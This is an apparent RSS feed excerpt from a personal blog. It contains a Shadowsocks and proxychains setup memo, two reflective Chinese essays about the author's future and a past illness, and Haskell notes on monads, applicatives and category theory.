      <content:encoded><![CDATA[<h2 id="ss-client">SS Client</h2><div class="gk-code hljs" data-gk-id="BLOCK1"><div class="gk-code-display"><pre><span class="line">$ [sudo] pip3 install shadowsocks</span><br></pre></div></div><p ><code>/etc/ss.json</code> :</p><div class="gk-code hljs" data-gk-id="BLOCK2"><div class="gk-code-display"><pre><span class="line">{</span><br><span class="line">    <span class="hljs-string">&quot;server&quot;</span>: <span class="hljs-string">&quot;&lt;server ip&gt;&quot;</span>,</span><br><span class="line">    <span class="hljs-string">&quot;server_port&quot;</span>: <span class="hljs-string">&quot;&lt;server port&gt;&quot;</span>, <span class="hljs-comment">// must be Number</span></span><br><span class="line">    <span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-string">&quot;&lt;password&gt;&quot;</span>,</span><br><span class="line">    <span class="hljs-string">&quot;local_address&quot;</span>: <span class="hljs-string">&quot;127.0.0.1&quot;</span>,</span><br><span class="line">    <span class="hljs-string">&quot;local_port&quot;</span>: <span class="hljs-number">1081</span>,</span><br><span class="line">    <span class="hljs-string">&quot;timeout&quot;</span>: <span class="hljs-number">300</span>,</span><br><span class="line">    <span class="hljs-string">&quot;method&quot;</span>: <span class="hljs-string">&quot;aes-256-cfb&quot;</span>,</span><br><span class="line">    <span class="hljs-string">&quot;fast_open&quot;</span>: <span class="hljs-literal">false</span></span><br><span class="line">}</span><br></pre></div></div><div class="gk-code hljs" data-gk-id="BLOCK3"><div class="gk-code-display"><pre><span class="line">$ [sudo] sslocal -c /etc/ss.json -d start</span><br></pre></div></div><h2 id="proxychains">proxychains</h2><p >clone repository from <code>https://github.com/rofl0r/proxychains-ng</code> , <code>make &amp;&amp; sudo make install</code> .</p><p >Append following lines to <code>/etc/proxychains.conf</code> :</p><div class="gk-code hljs" data-gk-id="BLOCK4"><div class="gk-code-display"><pre><span class="line">[ProxyList]</span><br><span class="line"># add proxy here ...</span><br><span class="line"># meanwile</span><br><span class="line"># defaults set to &quot;tor&quot;</span><br><span class="line">socks5127.0.0.11081</span><br></pre></div></div><p >Usage: <code>proxychains [command]</code> .</p><h2 id="chrome-addons">Chrome Addons</h2><p ><code>SwitchyOmega</code> .</p>]]></content:encoded>
      
      
      <category domain="https://i.hsfzxjy.site/categories/Memo/">Memo</category>
      
      
      <category domain="https://i.hsfzxjy.site/tags/SS/">SS</category>
      
      <category domain="https://i.hsfzxjy.site/tags/proxychains/">proxychains</category>
      
      
      <comments>https://i.hsfzxjy.site/ss/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>一月七日杂感</title>
      <link>https://i.hsfzxjy.site/notitle-2019-01-07/</link>
      <guid>https://i.hsfzxjy.site/notitle-2019-01-07/</guid>
      <pubDate>Sun, 06 Jan 2019 16:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p &gt;前几天和阿三聚了一餐，这大概是一年到头来我们为数不多能好好聊天的时间。&lt;/p&gt;
&lt;p &gt;我们谈了很多，从考试到动漫到未来。令人惊讶的是，他表现出了一种忧虑，对未来的忧虑。在我看来这是很少见的。忧虑的一方面是关于短期的未来，有 CSST 面试的压力，以及成堆的考试；另一方面</description>
        
      
      
      
      <content:encoded><![CDATA[<p >前几天和阿三聚了一餐，这大概是一年到头来我们为数不多能好好聊天的时间。</p><p >我们谈了很多，从考试到动漫到未来。令人惊讶的是，他表现出了一种忧虑，对未来的忧虑。在我看来这是很少见的。忧虑的一方面是关于短期的未来，有 CSST 面试的压力，以及成堆的考试；另一方面是更遥远的未来，暑研或是升学或是就业。再往前两天的团队聚餐上大家的讨论，关于资本寒冬的，关于机器学习的逐渐饱和，都给我们留下了深刻的印象。</p><p >我问他不做金融吗。他说经过暑假的实习他也对这个行业失去了兴趣，量化交易不过也是机械性的脑力劳动（如有冒犯请见谅，这是我凭回忆归纳的，然而我对这个行业一窍不通）。现在他也开始迷茫将来要做什么。</p><p >他说有点羡慕我的状态，对周围的环境不 care，沉浸在自己的小世界当中。这个学校没能让他满意，没有地缘优势，身边足够优秀的人还是少了些。但这些在我看来都不重要，甚至还是优点。</p><p >吃完饭后已经是九点半了。雾霾洇开了路灯的光晕，整个城市笼上了一种眩目的橘黄色。</p><p >在那之后，我又断断续续想了很多。机器学习真的是我喜欢的吗？钻研理论时我是开心的，但我没有记笔记的习惯；做实验有时会让我很头疼，冗长而累人，很多时候结果还并不好。让我快乐的其实是在概念间的思维游走，但真正深入细节却是有些乏味的。许多创意到了底层，无非也是各种指标的相互比较——除非你是一个子领域的开山鼻祖。但这需要热情和灵感，我认为我没有。我之所以处在这其中，是因为它热门——至少当时是的，而且不让我讨厌，无论是数学或是 CS。</p><p >我想我最纯粹的快乐就是写代码了，次之就是钻研各种新东西，数学上或程序上的。但这两者都不能让我活下去。逐利的代码是需要迎合市场的，但这很累，而且会包含许多我讨厌的东西。我从来不是一个好的产品经理，也不想成为。我只希望能依自由意志写代码，折腾各种东西，这些产出多是无用的或是无法迎合市场的，但又确实能让我感到快乐。这个愿望其实是奢侈的。如果把「写代码」替成「追番」、「玩手机」、「打机」，那就能契合到很多人身上。我还是需要一门手艺，支撑我活下去，而让我的纯粹爱好成为我的业余游戏。</p><p >既然如此，为什么不尝试将手艺的价值最大化呢？比如出国。在另一个环境凭这门手艺或许能活得更好。我觉得这其中有太多令我望而却步的东西，包括和很多人打交道，包括环境的切换。很多人觉得没什么，但我却十分在意。或许是刻在基因里的一种病吧。不想和人说话；一旦浸入了一个环境，出来时会痛苦万分。升学时也是，回家时也是。想改也改不了。</p><p >所以呢，依然没有结论，未来依旧是迷茫的。这两年多我错过了很多机会，实不相瞒是故意的。但也意外收获了一些好处，或许可以成为新的契机。很多问题要随着时间的流动才能找到答案，我也祈祷如此吧。</p>]]></content:encoded>
      
      
      <category domain="https://i.hsfzxjy.site/categories/Soliloquy/">Soliloquy</category>
      
      
      
      <comments>https://i.hsfzxjy.site/notitle-2019-01-07/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>四月·病</title>
      <link>https://i.hsfzxjy.site/april-illness/</link>
      <guid>https://i.hsfzxjy.site/april-illness/</guid>
      <pubDate>Sun, 30 Dec 2018 16:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p &gt;四月，我大病了一场。先是呼吸时胸口隐隐作痛，我以为是运动伤害，毕竟始发时刚剧烈地骑完车。后而逐渐变成呼吸困难，镜子里的自己嘴唇发紫，睡觉时也像是有人扼着喉咙。我开始在傍晚时发烧。&lt;/p&gt;
&lt;p &gt;清明前后，春寒未散。宿舍已没有了暖气。清明节我在宿舍躺了两天，睡到饭点起来吃</description>
        
      
      
      
      <content:encoded><![CDATA[<p >四月，我大病了一场。先是呼吸时胸口隐隐作痛，我以为是运动伤害，毕竟始发时刚剧烈地骑完车。后而逐渐变成呼吸困难，镜子里的自己嘴唇发紫，睡觉时也像是有人扼着喉咙。我开始在傍晚时发烧。</p><p >清明前后，春寒未散。宿舍已没有了暖气。清明节我在宿舍躺了两天，睡到饭点起来吃，吃完继续睡。两个舍友出去玩了，合肥一直在下雨，屋里甚是寒冷。</p><p >躺在床上，我不停查找着可能的病源。我是个不轻易上医院的人，但这突如其来的状况着实让我害怕。我想在相关疾病的列表中寻求安慰，希望只是一场小病。为什么不上医院呢？去医院一切就定下来了，无论结果是好是坏。但如果不去，就还有无数的可能。我总是这么想。</p><p >入夜时，我也会想，如果这真是糟糕的病又该怎么办呢？我在一个陌生的城市，一切都会变得麻烦；我的人生才刚刚开始，还有很多事没有做。诸如此类我想了很多很多，从黄昏到夜深，混杂着不安与飘忽不定的希冀入睡，再到早晨。</p><p >后来，病似乎开始好转。发烧渐渐没有了，但胸疼和窒息感却交替着。每当胸疼开始减轻时，就会有只无形的手慢慢握紧我的喉咙；手松开时，胸疼又开始发作。如此往复。我数次怀疑自己再也好不了了。四月在浑浑噩噩中度过了。</p><p >庆幸的是，期中考没有被耽误，我妈来看我时也没有发现异样。这话不知怎么的就脱口而出了，连我也觉得自己有些病态。明明可能是危及生命的事情，却要在众人面前尽力隐藏。我认为这种事不好，却一直在做，仿佛被周围人知道后天会塌下来一样。</p><p >接下来的五月，天气暖了起来，胸疼和窒息开始消退。当然我觉得不完全是温度的作用。持续的雨也渐渐停了。我似乎看到了希望。再到六月和炎热的七月，病终于完全好了。我可以自由地跑动，也可以大力地呼吸。这种没有不适感的感觉，客观上只过了三个月，主观上却长的像一生。</p><p >再后来，我没有和任何人提起过这段经历，如今病好了，也更不会了。我不知道这是什么病，现在也不想知道，以后也希望它不要再来了。这三个月里我想了很多很多。当自己恍惚看见时间的尽头时，才突然意识到曾经浪费了许多时间。多次感叹时间不够用，没能做成想做的事，我却把时间花在许多无关紧要的东西上。小时候我讨厌成为这样的人，但还是成为了这样的人。而如今，生活逐渐被紧要却无趣的事填满了。就算我改正这个毛病，乐趣也变少了。无奈。</p><p >而至于为什么又想起这件事，我也不清楚。只是单纯觉得岁末应该写点东西吧。</p>]]></content:encoded>
      
      
      <category domain="https://i.hsfzxjy.site/categories/Soliloquy/">Soliloquy</category>
      
      
      
      <comments>https://i.hsfzxjy.site/april-illness/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Haskell 笔记：State Monad</title>
      <link>https://i.hsfzxjy.site/haskell-state-monad/</link>
      <guid>https://i.hsfzxjy.site/haskell-state-monad/</guid>
      <pubDate>Fri, 14 Dec 2018 16:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p &gt;一个依赖于外部状态 &lt;code&gt;s&lt;/code&gt; 的伪函数 &lt;code&gt;f&amp;#39; :: a -&amp;gt; b&lt;/code&gt;，我们可以将其改写为 &lt;code&gt;f :: a -&amp;gt; s -&amp;gt; (b, s)&lt;/code&gt; 使其良定。即，在输入输出中显式传递状态 &lt;c</description>
        
      
      
      
      <content:encoded><![CDATA[<p >一个依赖于外部状态 <code>s</code> 的伪函数 <code>f&#39; :: a -&gt; b</code>，我们可以将其改写为 <code>f :: a -&gt; s -&gt; (b, s)</code> 使其良定。即，在输入输出中显式传递状态 <code>s</code>。现在，我们需要利用 Monad 将状态传递过程隐藏起来。</p><p >注意到，输出值 <code>(b, s)</code> 中的末状态 <code>s</code> 不仅依赖于输入状态，更依赖于之前更改过状态的一系列函数及其逻辑。因此我们不能简单地将 Monad 定义为 <code>(a, s)</code> 类似的形式，否则两个函数用 <code>&gt;=&gt;</code> 结合的结果将与函数逻辑无关，这与我们的期望不符。</p><p >考虑如下定义：</p><div class="gk-code hljs" data-gk-id="BLOCK1"><div class="gk-code-display"><pre><span class="line"><span class="hljs-class"><span class="hljs-keyword">newtype</span> <span class="hljs-type">State</span> s a = { <span class="hljs-title">runState</span> :: <span class="hljs-title">s</span> -&gt; (<span class="hljs-title">a</span>, <span class="hljs-title">s</span>) }</span></span><br></pre></div></div><p  class="par"> 由于 <code>-&gt;</code> 的右结合性，<code>f :: a -&gt; s -&gt; (b, s)</code> 和 <code>f :: a -&gt; State s b</code> 等价。固定 <code>s</code>，则 <code>State s</code> 可以成为一个 Monad。一个类型为 <code>State s a</code> 的值通常也被称为一个 state processor。</p><p >现在尝试定义 <code>(&gt;&gt;=) :: State s a -&gt; (a -&gt; State s b) -&gt; State s b</code>。若 <code>p &gt;&gt;= f</code>，则 <code>p</code> 蕴含了在此之前所有的状态处理逻辑，我们希望将 <code>p</code> 和 <code>f</code> 的逻辑融合在一起，成为一个新的 state processor，并作为返回值。</p><div class="gk-code hljs" data-gk-id="BLOCK2"><div class="gk-code-display"><pre><span class="line"><span class="hljs-title">p</span> &gt;&gt;= f = </span><br><span class="line">    (</span><br><span class="line">        <span class="hljs-type">State</span> $ \s -&gt; (b, s&#x27;&#x27;)</span><br><span class="line">        <span class="hljs-keyword">where</span></span><br><span class="line">            (a, s&#x27;) = (runState p) s</span><br><span class="line">            p2 = f a <span class="hljs-comment">-- :: State s b</span></span><br><span class="line">            (b, s&#x27;&#x27;) = (runState p2) s&#x27;</span><br><span class="line">    )</span><br></pre></div></div><p  class="par"> <code>return</code> 是平凡的：</p><div class="gk-code hljs" data-gk-id="BLOCK3"><div class="gk-code-display"><pre><span class="line"><span class="hljs-title">return</span> a = <span class="hljs-type">State</span> $ (\s -&gt; (a, s))</span><br></pre></div></div><p  class="par"> <code>fmap</code> 可以作如下定义：</p><div class="gk-code hljs" data-gk-id="BLOCK4"><div class="gk-code-display"><pre><span class="line"><span class="hljs-title">fmap</span> :: (a -&gt; b) -&gt; (<span class="hljs-type">State</span> s a) -&gt; (<span class="hljs-type">State</span> s b)</span><br><span class="line"><span class="hljs-title">fmap</span> f = </span><br><span class="line">    (</span><br><span class="line">        \pIn -&gt; (</span><br><span class="line">            \s -&gt; (b, s&#x27;)</span><br><span class="line">            <span class="hljs-keyword">where</span></span><br><span class="line">                (a, s&#x27;) = (runState pIn) s</span><br><span class="line">                b = f a</span><br><span class="line">        )</span><br></pre></div></div><p  class="par"> 如此一来，我们可以将一系列的依赖外部状态的函数串成一个依赖外部状态的函数，传以初始状态，便可得到结果。</p>]]></content:encoded>
      
      
      <category domain="https://i.hsfzxjy.site/categories/Tech/">Tech</category>
      
      
      <category domain="https://i.hsfzxjy.site/tags/Haskell/">Haskell</category>
      
      
      <comments>https://i.hsfzxjy.site/haskell-state-monad/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Haskell 笔记：Monad 引论</title>
      <link>https://i.hsfzxjy.site/haskell-monad/</link>
      <guid>https://i.hsfzxjy.site/haskell-monad/</guid>
      <pubDate>Thu, 13 Dec 2018 16:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;动机&quot;&gt;动机&lt;/h2&gt;
&lt;p &gt;pure functions 看似完美，但却不能模拟现实世界中的诸多任务。这是由于 pure functions 是良定的映射，对于特定的输入值会返回唯一的输出。这种模式在面对如下任务时会显得苍白无力：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;有</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="动机">动机</h2><p >pure functions 看似完美，但却不能模拟现实世界中的诸多任务。这是由于 pure functions 是良定的映射，对于特定的输入值会返回唯一的输出。这种模式在面对如下任务时会显得苍白无力：</p><ul><li>有可能失败的任务。如大多数的 IO。</li><li>依赖外部状态的任务。如（伪）随机数生成器。</li><li>非确定性任务，即对于确定的输入可能有多个输出。这种在 IP 中较为少见。</li><li>对外界会造成影响的任务。如大多数的写入过程。</li></ul><p  class="par"> 这些问题可以用数学中的<strong>域扩充技巧</strong>来解决。</p><h2 id="域扩充">域扩充</h2><p >在数学中，当定义问题的范畴不足以容纳问题的解时，我们通常会对相关的范畴进行扩充。类似的技巧同样也可以应用在这里。</p><p >假设一个不良定的函数 <code>f: A -&gt; B</code>：</p><ul><li>如果 <code>f</code> 有可能失败，我们可以将 <code>B</code> 扩充为 <code>Err(B) ∪ &#123; reasons of failures &#125;</code>，其中 <code>reasons of failures</code> 可能是对异常的描述，也可以是空值一类的东西。则 <code>f&#39;: A -&gt; Err(B)</code> 是良定的映射，且与 <code>f</code> 行为一致。事实上，这就是 Maybe Monad 和 Either Monad。</li><li>如果 <code>f</code> 依赖于外部状态，我们定义 <code>Pref(B)</code> 为 <strong>从外部状态空间到 B 的映射的全体</strong>，则 <code>f&#39;: A -&gt; Pref(B)</code> 为良定的映射，且行为和 <code>f</code> 一致。换言之，对于特定的输入 <code>a</code>，<code>f&#39;(a)</code> 返回一个函数，其中蕴含了已知 <code>a</code> 时如何从各种不同状态得到结果的逻辑。事实上，这就是 State Monad。</li><li>如果 <code>f</code> 具有非确定性，我们将 <code>B</code> 扩充为 <code>Power(B)</code>，即 <code>B</code> 的幂集。则 <code>f&#39;: A -&gt; Power(B)</code> 为良定的映射，且行为与 <code>f</code> 一致。事实上，这就是 List Monad。</li><li>如果 <code>f</code> 依赖于真实世界，我们将 <code>B</code> 扩充为 <code>IO(B)</code>，其中的元素为一些值域为 <code>B</code> 的<strong>伪函数</strong>，可能对真实世界有影响。这些伪函数已经脱离了 pure functions 的范畴，但将它们看成元素是没有问题的。如此一来 <code>f&#39;: A -&gt; IO(B)</code> 为良定的映射，且行为与 <code>f</code> 一致。事实上，这就是 IO Monad。</li></ul><p >以上操作都有一个共同点，即对一个不良定函数的值域做了扩充，使之变成良定函数。如果用 Haskell 语言描述，它们都有相似的型：<code>f :: a -&gt; m b</code>，其中 <code>m</code> 为扩充规则。</p><p >一个问题随之而来：这样的新函数该怎么结合？为此我们要对相关逻辑进行抽象。这就是 Monad。</p><h2 id="monad">Monad</h2><p >这里我们尝试从实际需求出发，导出一个 Type Constructor 成为 Monad 的必要条件。</p><p >约定两个名称：</p><ul><li>称 <code>a -&gt; m b</code> 型函数为 monadic function</li><li>称 <code>a -&gt; b</code> 型函数为 non-monadic function</li></ul><p >首先需要解决的是 monadic functions 如何结合的问题。这个问题具有重要的现实意义。monadic function 常常代表某种计算任务，它们之间的结合相当于把若干计算任务串行化，而后者是非常常见的需求。</p><p >我们希望有一种运算符有如下的类型 <code>(b -&gt; m c) -&gt; (a -&gt; m b) -&gt; (a -&gt; m c)</code>，在此记为 <code>&gt;=&gt;</code> （因其形状，常被叫做 fish operator）。一个自然的想法是，Monad <code>m</code> 需要某种平凡的拆箱操作 <code>extract&#39; :: m a -&gt; a</code>。所谓“平凡”，即 <code>extract&#39;</code> 不应该丢失参数的任何信息。但这往往不能实现，因为 <code>m a</code> 通常会比 <code>a</code> 包含更多的信息，导致 <code>extract&#39;</code> 无法构成良定的映射。例如 <code>Maybe a</code> 中的值 <code>Nothing</code> 就无法在 <code>a</code> 中找到对应的值。</p><p >而事实上，我们不需要条件这么强的拆箱操作。在 <code>m</code> 已是 Functor 的情况下，拆箱操作可以弱化为 <code>join :: m (m a) -&gt; m a</code>。我们尝试用 <code>fmap</code>、 <code>join</code> 合成 <code>&gt;=&gt;</code>。</p><div class="gk-code hljs" data-gk-id="BLOCK1"><div class="gk-code-display"><pre><span class="line"><span class="hljs-title">f</span> :: b -&gt; m c</span><br><span class="line"><span class="hljs-title">g</span> :: a -&gt; m b</span><br><span class="line"></span><br><span class="line"><span class="hljs-title">fmap</span> f :: m b -&gt; m (m c)</span><br><span class="line">(fmap f) . g :: a -&gt; m (m c)</span><br><span class="line"><span class="hljs-title">join</span> . (fmap f) . g :: a -&gt; m c</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">-- i.e.</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-title">f</span> &gt;=&gt; g = join . (fmap f) . g</span><br></pre></div></div><p >Functor 的假设是容易成立的。当然我们可以定义多个不同的 <code>fmap</code>，如此产生的 Monad 会有不同的语义。<code>join</code> 的假设也是容易成立的，<code>m (m a)</code> 通常和 <code>m a</code> 包含相同多的信息。故此做法是实际可行的。</p><p >我们再考虑 monadic function 和 non-monadic function 结合的问题。期望有如此一个运算：<code>&gt;.&gt; :: (b -&gt; c) -&gt; (a -&gt; m b) -&gt; (a -&gt; m c)</code>。注意，此处返回值是 <code>a -&gt; m c</code> 而不是 <code>a -&gt; c</code>，因为我们不希望 <code>a -&gt; m b</code> 产生的额外信息有所丢失。自然地，我们希望有一个平凡的装箱操作，<code>return :: a -&gt; m a</code>。如此一来便可结合 <code>&gt;=&gt;</code> 完成上面的运算：</p><div class="gk-code hljs" data-gk-id="BLOCK2"><div class="gk-code-display"><pre><span class="line"><span class="hljs-title">f</span> :: b -&gt; c</span><br><span class="line"><span class="hljs-title">g</span> :: a -&gt; m b</span><br><span class="line"></span><br><span class="line"><span class="hljs-title">return</span> . f :: b -&gt; m c</span><br><span class="line">(return . f) &gt;=&gt; g :: a -&gt; m c</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">-- i.e.</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-title">f</span> &gt;.&gt; g :: (return . f) &gt;=&gt; g</span><br></pre></div></div><p  class="par"> non-monadic function 和 monadic function 另一个方向的结合是平凡的。</p><p >综上我们可以得到成为 Monad 的基本条件：</p><ul><li>是 Functor，存在 <code>fmap :: (a -&gt; b) -&gt; m a -&gt; m b</code></li><li>有一个平凡的拆箱操作 <code>join :: m (m a) -&gt; m a</code></li><li>有一个平凡的装箱操作 <code>return :: a -&gt; m a</code></li></ul><p >为了描述平凡，我们要求三个函数必须满足如下公理（下面的 <code>f</code> 为 non-monadic function）：</p><ol><li><code>return . f == (fmap f) . return</code> （<code>return</code> 的平凡性）</li><li><code>join . fmap (fmap f) == (fmap f) . join</code> （<code>join</code> 的平凡性）</li></ol><blockquote><p >事实上在 Category Theory 中，还有另外两条公理：</p><ul><li><code>join . (fmap join) == join . join</code></li><li><code>join . fmap return == join . return == id</code></li></ul><p >以上四条公理描述了 <code>Id</code>（恒等 Functor）、<code>m</code>、<code>m^2</code>、<code>m^3</code> 之间的泛性质，并使图交换。</p></blockquote><h2 id="monad-typeclass">Monad Typeclass</h2><p >以下为 Prelude 中的定义：</p><div class="gk-code hljs" data-gk-id="BLOCK3"><div class="gk-code-display"><pre><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-type">Functor</span> m =&gt; m a <span class="hljs-keyword">where</span></span></span><br><span class="line"></span><br><span class="line">    return :: a -&gt; m a</span><br><span class="line">    (&gt;&gt;=)  :: m a -&gt; (a -&gt; m b) -&gt; m b</span><br></pre></div></div><p >此处没有出现 <code>join</code>，也没有 fish operator，而是使用了一个更常用的算符 <code>&gt;&gt;=</code> （通常称为 bind operator）。这是因为在实际中我们不直接将函数结合，而是使用 non-pointfree 的写法。</p><p >此外，还有 <code>&gt;&gt; :: m a -&gt; m b -&gt; m b</code> 运算符。<code>return</code>、<code>&gt;&gt;=</code>、<code>&gt;&gt;</code> 三者是构成 do-notation 的基础。此处不再赘述。</p><h2 id="references-2">References</h2><ul><li><a href="https://en.wikibooks.org/wiki/Haskell/Category_theory">Haskell/Category Theory</a></li><li><a href="https://cdsmith.wordpress.com/2012/04/18/why-do-monads-matter/">Why Do Monads Matter?</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://i.hsfzxjy.site/categories/Tech/">Tech</category>
      
      
      <category domain="https://i.hsfzxjy.site/tags/Haskell/">Haskell</category>
      
      
      <comments>https://i.hsfzxjy.site/haskell-monad/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Haskell 笔记：Applicative</title>
      <link>https://i.hsfzxjy.site/haskell-applicative/</link>
      <guid>https://i.hsfzxjy.site/haskell-applicative/</guid>
      <pubDate>Sun, 18 Nov 2018 02:29:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;motivation&quot;&gt;Motivation&lt;/h2&gt;
&lt;p &gt;&lt;code&gt;Functor&lt;/code&gt; solves the problem of mapping regular single-parameter functions into a sub-cat</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="motivation">Motivation</h2><p ><code>Functor</code> solves the problem of mapping regular single-parameter functions into a sub-category, but that’s not easy for functions with more than one parameter.</p><p >Let’s consider a function with two parameters <code>f :: a -&gt; b -&gt; c</code>, which can also read as <code>a -&gt; (b -&gt; c)</code>. Applying <code>fmap</code> on <code>f</code> will yield <code>fmap f :: m a -&gt; m (b -&gt; c)</code>. That’s still distant from what we expect: <code>f&#39; :: m a -&gt; m b -&gt; m c</code>. To get <code>f&#39;</code>, we need a transform from <code>m (b -&gt; c)</code> to <code>m b -&gt; m c</code>. Here we denote it as <code>&lt;*&gt; :: m （b -&gt; c) -&gt; m b -&gt; m c</code>. We will later show that such transform is universal for functions with more parameters.</p><p >Now consider a function with three parameters <code>f :: a -&gt; b -&gt; c -&gt; d</code>. We are going to transform it into a wrapped-value version, with the help of <code>fmap</code> and <code>&lt;*&gt;</code>.</p><div class="gk-code hljs" data-gk-id="BLOCK1"><div class="gk-code-display"><pre><span class="line"><span class="hljs-title">f</span> :: a -&gt; b -&gt; c -&gt; d</span><br><span class="line"></span><br><span class="line">(fmap f) :: m a -&gt; m (b -&gt; (c -&gt; d))</span><br><span class="line"></span><br><span class="line">\a_ b_ -&gt; (fmap f a_) &lt;*&gt; b_</span><br><span class="line">    :: m a -&gt; m b -&gt; m (c -&gt; d)</span><br><span class="line"></span><br><span class="line">\a_ b_ c_ -&gt; ((fmap f a_) &lt;*&gt; b_) &lt;*&gt; c_</span><br><span class="line">    :: m a -&gt; m b -&gt; m c -&gt; (m d)</span><br></pre></div></div><p  class="par"> Here <code>\a_ b_ c_ -&gt; ((fmap f a_) &lt;*&gt; b_) &lt;*&gt; c_</code> is in the desired type. For most of the time, applying parameters directly is actually what we want, instead of the function itself, so the code could simply be written as <code>((fmap f a) &lt;*&gt; b) &lt;*&gt; c</code>, where <code>a</code>, <code>b</code> and <code>c</code> are wrapped values. Parenthesis could be omitted if precedences are set properly, which leads to a neat and easy-to-read form:</p><div class="gk-code hljs" data-gk-id="BLOCK2"><div class="gk-code-display"><pre><span class="line"><span class="hljs-title">f</span> `fmap` a &lt;*&gt; b &lt;*&gt; c</span><br></pre></div></div><p  class="par"> In haskell, <code>fmap</code> has an infix name <code>&lt;$&gt;</code>. So finally we get: <code>f &lt;$&gt; a &lt;*&gt; b &lt;*&gt; c</code>.</p><h2 id="applicative">Applicative</h2><p >Haskell pre-defines a type class <code>Applicative</code>, which captures the pattern of <code>&lt;*&gt;</code>. Any type that implements <code>Applicative</code> works well with <code>&lt;$&gt;</code> and <code>&lt;*&gt;</code>.</p><div class="gk-code hljs" data-gk-id="BLOCK3"><div class="gk-code-display"><pre><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-type">Functor</span> f =&gt; <span class="hljs-type">Applicative</span> (<span class="hljs-title">f</span> :: * -&gt; *) <span class="hljs-keyword">where</span></span></span><br><span class="line">  pure :: a -&gt; f a</span><br><span class="line">  (&lt;*&gt;) :: f (a -&gt; b) -&gt; f a -&gt; f b</span><br><span class="line">  <span class="hljs-type">GHC</span>.<span class="hljs-type">Base</span>.liftA2 :: (a -&gt; b -&gt; c) -&gt; f a -&gt; f b -&gt; f c</span><br><span class="line">  (*&gt;) :: f a -&gt; f b -&gt; f b</span><br><span class="line">  (&lt;*) :: f a -&gt; f b -&gt; f a</span><br></pre></div></div><p  class="par"> Note that an <code>Applicative</code> is also a <code>Functor</code>. Apart from <code>&lt;*&gt;</code>, there are some other helper functions or operators in <code>Applicative</code>.</p><p ><code>pure</code> is equivalent to the default value constructor of <code>f</code>, e.g. <code>(:[])</code> for <code>List</code> or <code>Just</code> for <code>Maybe</code>. This may be handful when lifting an unwrapped value to a wrapped one.</p><p ><code>liftA2</code> transforms a binary operator to the corresponding version. The function exists as binary operators would be frequently passed among high-order functions.</p><p ><code>*&gt;</code> takes two wrapped parameters and simply returns the second one, which sequence up two wrapped values. This is quite useful for <code>Applicative</code> with action semantics, such as <code>IO</code>. In fact, it’s so useful that Haskell introduces a syntax sugar for it, known as the <code>do-notation</code>. Particularly:</p><div class="gk-code hljs" data-gk-id="BLOCK4"><div class="gk-code-display"><pre><span class="line"><span class="hljs-title">do</span></span><br><span class="line">    putStrLn <span class="hljs-string">&quot;1&quot;</span></span><br><span class="line">    putStrLn <span class="hljs-string">&quot;2&quot;</span></span><br></pre></div></div><p  class="par"> is equivalent to</p><div class="gk-code hljs" data-gk-id="BLOCK5"><div class="gk-code-display"><pre><span class="line"><span class="hljs-title">putStrLn</span> <span class="hljs-string">&quot;1&quot;</span> *&gt; putStrLn <span class="hljs-string">&quot;2&quot;</span></span><br></pre></div></div><p  class="par"> <code>&lt;*</code> is similar. Both will be reviewed while studying Monad.</p>]]></content:encoded>
      
      
      <category domain="https://i.hsfzxjy.site/categories/Tech/">Tech</category>
      
      
      <category domain="https://i.hsfzxjy.site/tags/Haskell/">Haskell</category>
      
      
      <comments>https://i.hsfzxjy.site/haskell-applicative/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Haskell 笔记：Category Theory and Functor</title>
      <link>https://i.hsfzxjy.site/haskell-category-theory-and-functor/</link>
      <guid>https://i.hsfzxjy.site/haskell-category-theory-and-functor/</guid>
      <pubDate>Sun, 18 Nov 2018 00:50:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;category-theory&quot;&gt;Category Theory&lt;/h2&gt;
&lt;p &gt;A category consists of three parts:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;A collection of objects.&lt;/li&gt;
&lt;li&gt;A colle</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="category-theory">Category Theory</h2><p >A category consists of three parts:</p><ul><li>A collection of objects.</li><li>A collection of morphisms, each of which map one object to another.</li><li>A composition operator of these morphisms, i.e. morphisms can be composed. If <code>f: A -&gt; B</code> and <code>g: B -&gt; C</code> are morphisms, <code>f.g</code> generates a new morphism <code>A -&gt; C</code>.</li></ul><p  class="par"> Note that a morphism has no specific semantics of mapping, but simply links two objects together. Morphisms are also called <strong>Arrows</strong>.</p><h3 id="examples">Examples</h3><h4 id="set-category-set">Set Category: Set</h4><p >All sets and standard functions form a category. Functions need not to be surjective, since morphisms have no mapping semantics.</p><h4 id="group-category-grp">Group Category: Grp</h4><p >All groups and homomorphisms between groups form a category. A group has specific algebaric structure, which morphisms should preserve.</p><h3 id="laws">Laws</h3><p >Three laws that a category should obey:</p><ul><li>Composition should be associative.</li><li>Composition operation should be enclosed in the category, i.e. if <code>f: A -&gt; B</code> and <code>g: B -&gt; C</code>, there must be a <code>h: A -&gt; C</code> satisfying <code>h = f . g</code>.</li><li>For each object <code>A</code>, there should exist an identity morphism <code>id(A): A -&gt; A</code> s.t. for every <code>f: A -&gt; B</code>, <code>f = id(A) . f = f . id(B)</code>.</li></ul><p  class="par"> Note that:</p><ul><li>There may exist serveral morphisms between <code>A</code> and <code>B</code>.</li><li>An identity has type <code>A -&gt; A</code>, but a morphism with such type needs not to be an identity.</li></ul><h3 id="functors-in-category-theory">Functors in Category Theory</h3><p 